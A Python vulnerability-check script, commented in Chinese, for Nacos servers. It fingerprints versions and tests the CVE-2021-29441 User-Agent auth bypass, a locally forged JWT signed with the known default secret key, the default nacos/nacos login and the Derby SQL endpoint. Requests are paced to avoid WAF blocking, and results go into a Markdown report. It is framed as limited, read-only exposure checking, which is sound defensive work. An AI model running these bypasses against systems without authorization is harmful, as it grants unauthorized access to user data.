#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 只读安全自查脚本（GET-only / 无写入 / 无爆破 / 无内存马 / 无命令执行）

覆盖:
  1. 指纹识别 + 版本探测        GET  {base}/v1/console/server/state
  2. 默认口令                   POST {base}/v1/auth/login  (仅内置默认值 nacos/nacos)
  3. CVE-2021-29441 UA 绕过     GET  {base}/v1/auth/users    (User-Agent: Nacos-Server)
  4. token.secret.key 默认值    GET  {base}/v1/auth/users    (用已知默认密钥现场签 JWT)
  5. Derby SQL 注入可达性       GET  {base}/v1/cs/ops/derby  (仅 select 1，不提取任何数据)

请求预算: 每目标 <= 12 次（含基线），用于规避 WAF 限流/封禁。
输出: 每目标一行结论 —— 真实命中 / 待确认 / 未命中，不做定级拔高。

用法:
  python nacos_readonly_check.py http://1.2.3.4:8848/nacos
  python nacos_readonly_check.py http://a:8848/nacos http://b:8848
  python nacos_readonly_check.py --file urls.txt
"""
import sys, os, json, time, base64, hmac, hashlib, argparse, urllib.request, urllib.error, urllib.parse, ssl

TIMEOUT = 10
SLEEP = 0.4                      # 请求间隔，控节奏
BROWSER_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
# Nacos 内置默认口令（仅此一条，绝不做字典爆破）
DEFAULT_CREDS = [("nacos", "nacos")]
# Nacos < 2.2.1 默认 JWT 密钥（QVD-2023-6271）
DEFAULT_SECRET = "SecretKey012345678901234567890123456789012345678901234567890123456789"
PATHS = ["", "/nacos", "/home/nacos"]

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE


def _req(url, ua=None, token=None, method="GET", data=None):
    """发一个请求，返回 (status, body_text, headers)。任何异常都不抛出。"""
    headers = {"User-Agent": ua or BROWSER_UA, "Accept": "*/*",
               "Connection": "close"}
    if token:
        headers["accessToken"] = token
    body = data.encode() if isinstance(data, str) else data
    if body is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=TIMEOUT, context=_CTX) as resp:
            raw = resp.read(65536)
            return resp.status, raw.decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(8192)
        except Exception:
            raw = b""
        return e.code, raw.decode("utf-8", "replace"), dict(e.headers or {})
    except Exception as e:
        return 0, "ERR:%s" % type(e).__name__, {}


def _jwt_default_key():
    """用已知默认密钥现场签一个 JWT（纯本地计算，不发包）。"""
    def b64u(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    hdr = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    pl = b64u(json.dumps({"sub": "nacos", "exp": int(time.time()) + 1800},
                         separators=(",", ":")).encode())
    si = "%s.%s" % (hdr, pl)
    sig = hmac.new(DEFAULT_SECRET.encode(), si.encode(), hashlib.sha256).digest()
    return "%s.%s" % (si, b64u(sig))


def check_target(target):
    t = target.strip().rstrip("/")
    if not t.startswith(("http://", "https://")):
        t = "http://" + t
    # 归一化：剥掉尾部已有的 /nacos，统一由 PATHS 拼
    for p in ("/home/nacos", "/nacos"):
        if t.endswith(p):
            t = t[: -len(p)]
            break

    res = {"target": t, "hits": [], "pending": [], "clean": [],
           "version": None, "base": None, "requests": 0, "evidence": []}

    # ---- 1. 指纹 + 版本 ----
    for p in PATHS:
        base = t + p
        st, body, hdrs = _req(base + "/")
        res["requests"] += 1
        time.sleep(SLEEP)
        is_nacos = False
        if st == 200 and ("nacos" in body.lower() or "Nacos" in body):
            is_nacos = True
        if not is_nacos:
            continue
        res["base"] = base
        st2, body2, _ = _req(base + "/v1/console/server/state")
        res["requests"] += 1
        time.sleep(SLEEP)
        if st2 == 200:
            try:
                j = json.loads(body2)
                res["version"] = j.get("version")
                res["evidence"].append("server/state: " + body2[:200])
            except Exception:
                res["evidence"].append("server/state(非JSON): " + body2[:120])
        break

    if not res["base"]:
        res["clean"].append("未识别为 Nacos（3 个路径均无指纹）")
        return res

    base = res["base"]

    # ---- 3. CVE-2021-29441: UA 绕过 ----
    st_bl, body_bl, _ = _req(base + "/v1/auth/users?pageNo=1&pageSize=1")
    res["requests"] += 1
    time.sleep(SLEEP)
    st_ua, body_ua, _ = _req(base + "/v1/auth/users?pageNo=1&pageSize=1", ua="Nacos-Server")
    res["requests"] += 1
    time.sleep(SLEEP)
    bypass = (st_ua == 200 and '"username"' in body_ua)
    if bypass:
        if st_bl != 200:
            res["hits"].append("CVE-2021-29441 鉴权绕过（User-Agent: Nacos-Server）")
            res["evidence"].append("UA绕过响应: " + body_ua[:200])
        else:
            res["pending"].append("users 接口无鉴权即可访问（非 UA 绕过，疑鉴权未开启）")
            res["evidence"].append("无UA亦200: " + body_bl[:200])
    elif st_ua == 200:
        res["pending"].append("users 接口返回 200 但无用户字段，需人工看响应")
    else:
        res["clean"].append("CVE-2021-29441 UA 绕过未命中 (HTTP %s)" % st_ua)

    # ---- 4. token.secret.key 默认值（现场签 JWT，单次只读 GET）----
    tok = _jwt_default_key()
    st_j, body_j, _ = _req(base + "/v1/auth/users?pageNo=1&pageSize=1", token=tok)
    res["requests"] += 1
    time.sleep(SLEEP)
    if st_j == 200 and '"username"' in body_j:
        res["hits"].append("token.secret.key 使用内置默认值 (QVD-2023-6271)")
        res["evidence"].append("默认密钥JWT被接受: " + body_j[:200])
    else:
        res["clean"].append("token.secret.key 默认值未命中 (HTTP %s)" % st_j)

    # ---- 2. 默认口令（仅 nacos/nacos）----
    for u, p in DEFAULT_CREDS:
        st_l, body_l, _ = _req(base + "/v1/auth/login", method="POST",
                               data=urllib.parse.urlencode({"username": u, "password": p}))
        res["requests"] += 1
        time.sleep(SLEEP)
        if st_l == 200 and "accessToken" in body_l:
            res["hits"].append("默认口令 %s/%s 可用" % (u, p))
            res["evidence"].append("login响应含accessToken")
            break
        elif st_l == 200:
            res["pending"].append("login 返回 200 但无 accessToken（可能鉴权已关闭）")
        else:
            res["clean"].append("默认口令未命中 (HTTP %s)" % st_l)

    # ---- 5. Derby SQL 注入可达性（只 select 1，不提取数据）----
    st_d, body_d, _ = _req(base + "/v1/cs/ops/derby?sql=" +
                           urllib.parse.quote("select 1 as a"))
    res["requests"] += 1
    time.sleep(SLEEP)
    if st_d == 200 and ("a" in body_d or "1" in body_d):
        res["pending"].append("derby 接口可达且执行了 SQL（CNVD-2020-67618 疑似命中，人工复核）")
        res["evidence"].append("derby响应: " + body_d[:200])
    else:
        res["clean"].append("derby SQL 注入接口未命中 (HTTP %s)" % st_d)

    return res


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("urls", nargs="*")
    ap.add_argument("--file", help="每行一个 URL 的清单文件")
    ap.add_argument("--out", default="nacos_check_report.md")
    a = ap.parse_args()

    targets = list(a.urls)
    if a.file:
        with open(a.file, "r", encoding="utf-8-sig", errors="replace") as f:
            targets += [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    targets = [x for x in targets]
    if not targets:
        print("没有目标。用法: python nacos_readonly_check.py http://host:8848/nacos")
        return 1

    rows = []
    for i, tg in enumerate(targets, 1):
        print("[%d/%d] %s ..." % (i, len(targets), tg), flush=True)
        try:
            rows.append(check_target(tg))
        except KeyboardInterrupt:
            break
        except Exception as e:
            rows.append({"target": tg, "hits": [], "pending": [], "clean": ["脚本异常:%s" % e],
                         "version": None, "base": None, "requests": 0, "evidence": []})

    lines = ["# Nacos 只读自查报告", "",
             "> 仅 GET 只读 + 单次默认口令尝试；未做写入/删除/内存马/命令执行/字典爆破。",
             "> 结论用于暴露面排查，不等同于漏洞定级。", "", "## 汇总", "",
             "| # | 目标 | 版本 | 真实命中 | 待确认 | 未命中 | 请求数 |",
             "|---|---|---|---|---|---|---|"]
    for i, r in enumerate(rows, 1):
        lines.append("| %d | %s | %s | %s | %s | %s | %d |" % (
            i, r["target"], r.get("version") or "-",
            "<br>".join(r["hits"]) or "-",
            "<br>".join(r["pending"]) or "-",
            "<br>".join(r["clean"]) or "-", r.get("requests", 0)))
    lines += ["", "## 明细", ""]
    for i, r in enumerate(rows, 1):
        lines += ["### %d. %s" % (i, r["target"]), "",
                  "- 识别基路径: `%s`" % (r.get("base") or "未识别"),
                  "- 版本: `%s`" % (r.get("version") or "不可判定"),
                  "- 请求数: %d" % r.get("requests", 0), ""]
        for tag, key in (("真实命中", "hits"), ("待确认", "pending"), ("未命中", "clean")):
            if r[key]:
                lines.append("- **%s**: %s" % (tag, "；".join(r[key])))
        if r.get("evidence"):
            lines += ["", "<details><summary>原始证据（含可能的目标数据，注意留存规范）</summary>", "", "```"]
            lines += [e.replace("\n", " ")[:300] for e in r["evidence"]]
            lines += ["```", "", "</details>"]
        lines.append("")

    out = os.path.abspath(a.out)
    with open(out, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print("\n报告已写入: %s" % out)
    hit = [r["target"] for r in rows if r["hits"]]
    pend = [r["target"] for r in rows if r["pending"]]
    print("真实命中 %d 个: %s" % (len(hit), hit or "-"))
    print("待确认   %d 个: %s" % (len(pend), pend or "-"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
